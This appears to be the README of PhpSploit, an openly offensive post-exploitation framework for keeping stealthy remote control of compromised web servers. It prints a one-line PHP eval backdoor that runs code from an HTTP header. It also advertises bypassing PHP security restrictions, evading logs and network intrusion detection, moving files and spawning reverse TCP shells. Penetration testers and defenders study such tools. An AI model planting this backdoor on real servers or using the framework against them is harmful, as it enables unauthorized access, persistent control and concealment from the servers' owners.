### PhpSploit: _Furtive post-exploitation framework_

PhpSploit is a **remote control** framework, aiming to provide a **stealth**
interactive shell-like connection over HTTP between client and web server.
It is a post-exploitation tool capable to maintain access to a
compromised web server for **privilege escalation** purposes.

[![travis build](https://travis-ci.org/nil0x42/phpsploit.svg?branch=master)](https://travis-ci.org/nil0x42/phpsploit)
[![codacy code quality](https://api.codacy.com/project/badge/Grade/b998fe23c25f40a78c6c35c722bb9fa0)](https://app.codacy.com/app/nil0x42/phpsploit?utm_source=github.com&utm_medium=referral&utm_content=nil0x42/phpsploit&utm_campaign=Badge_Grade_Dashboard)
[![lgtm alerts](https://img.shields.io/lgtm/alerts/g/nil0x42/phpsploit.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/nil0x42/phpsploit/alerts/)
[![codecov coverage](https://codecov.io/gh/nil0x42/phpsploit/branch/master/graph/badge.svg)](https://codecov.io/gh/nil0x42/phpsploit)
[![codeclimate maintainability](https://api.codeclimate.com/v1/badges/6986200c1729b4a70a40/maintainability)](https://codeclimate.com/github/nil0x42/phpsploit/maintainability)
[![license](https://img.shields.io/github/license/nil0x42/phpsploit.svg)](https://github.com/nil0x42/phpsploit/blob/master/LICENSE)
[![requires.io requirements](https://requires.io/github/nil0x42/phpsploit/requirements.svg?branch=master)](https://requires.io/github/nil0x42/phpsploit/requirements/?branch=master)
[![pyup.io requirements](https://pyup.io/repos/github/nil0x42/phpsploit/python-3-shield.svg)](https://pyup.io/repos/github/nil0x42/phpsploit/)
[![sync.io vulnerabilities](https://snyk.io/test/github/nil0x42/phpsploit/badge.svg)](https://snyk.io/test/github/nil0x42/phpsploit)


![phpsploit demo](data/img/phpsploit-demo.png)

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Overview

The obfuscated communication is accomplished using HTTP headers under
standard client requests and web server's relative responses, tunneled
through a tiny **polymorphic backdoor**:

```php
<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
```

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Features

-   **Efficient**: More than 20 plugins to automate post-exploitation tasks
    -   Run commands and browse filesystem, bypassing PHP security restrictions
    -   Upload/Download files between client and target
    -   Edit remote files through local text editor
    -   Run SQL console on target system
    -   Spawn reverse TCP shells

-   **Stealth**: The framework is made by paranoids, for paranoids
    -   Nearly invisible by log analysis and NIDS signature detection
    -   Safe-mode and common _PHP security restrictions bypass_
    -   Communications are hidden in HTTP Headers
    -   Loaded payloads are obfuscated to _bypass NIDS_
    -   http/https/socks4/socks5 **Proxy support**

-   **Convenient**: A robust interface with many crucial features
    -   Detailed help for any command or option (type `help`)
    -   _Cross-platform_ on both the client and the server.
    -   Powerful interface with completion and multi-command support
    -   Session saving/loading feature & persistent history
    -   Multi-request support for large payloads (such as uploads)
    -   Provides a powerful, highly configurable settings engine
    -   Each setting, such as user-agent has a _polymorphic mode_
    -   Customisable environment variables for plugin interaction
    -   Provides a complete plugin development API

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Supported platforms (as attacker):

-   GNU/Linux
-   Mac OS X

#### Supported platforms (as target):

-   GNU/Linux
-   BSD Like
-   Mac OS X
-   Windows NT

## Contributors

Thanks goes to these people ([emoji key](https://github.com/all-contributors/all-contributors#emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore -->
<table><tr><td align="center"><a href="https://exdemia.com"><img src="https://avatars1.githubusercontent.com/u/3504393?v=4" width="100px;" alt="nil0x42"/><br /><sub><b>nil0x42</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Code">💻</a> <a href="#infra-nil0x42" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#plugin-nil0x42" title="Plugin/utility libraries">🔌</a> <a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Tests">⚠️</a></td><td align="center"><a href="https://github.com/shiney-wh"><img src="https://avatars1.githubusercontent.com/u/20907184?v=4" width="100px;" alt="shiney-wh"/><br /><sub><b>shiney-wh</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=shiney-wh" title="Code">💻</a> <a href="#plugin-shiney-wh" title="Plugin/utility libraries">🔌</a></td><td align="center"><a href="http://wapiflapi.github.io"><img src="https://avatars3.githubusercontent.com/u/1619783?v=4" width="100px;" alt="Wannes Rombouts"/><br /><sub><b>Wannes Rombouts</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=wapiflapi" title="Code">💻</a> <a href="#maintenance-wapiflapi" title="Maintenance">🚧</a></td><td align="center"><a href="http://yurilz.com"><img src="https://avatars1.githubusercontent.com/u/6031769?v=4" width="100px;" alt="Amine Ben Asker"/><br /><sub><b>Amine Ben Asker</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=yurilaaziz" title="Code">💻</a> <a href="#maintenance-yurilaaziz" title="Maintenance">🚧</a></td><td align="center"><a href="http://twitter.com/jnazario"><img src="https://avatars1.githubusercontent.com/u/5619153?v=4" width="100px;" alt="jose nazario"/><br /><sub><b>jose nazario</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=paralax" title="Documentation">📖</a> <a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Aparalax" title="Bug reports">🐛</a></td><td align="center"><a href="http://wikisecure.net"><img src="https://avatars3.githubusercontent.com/u/156915?v=4" width="100px;" alt="Sujit Ghosal"/><br /><sub><b>Sujit Ghosal</b></sub></a><br /><a href="http://wikisecure.net/a-walk-through-of-phpsploit-backdoor/" title="Blogposts">📝</a></td></tr></table>
<!-- ALL-CONTRIBUTORS-LIST:END -->

_This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!_
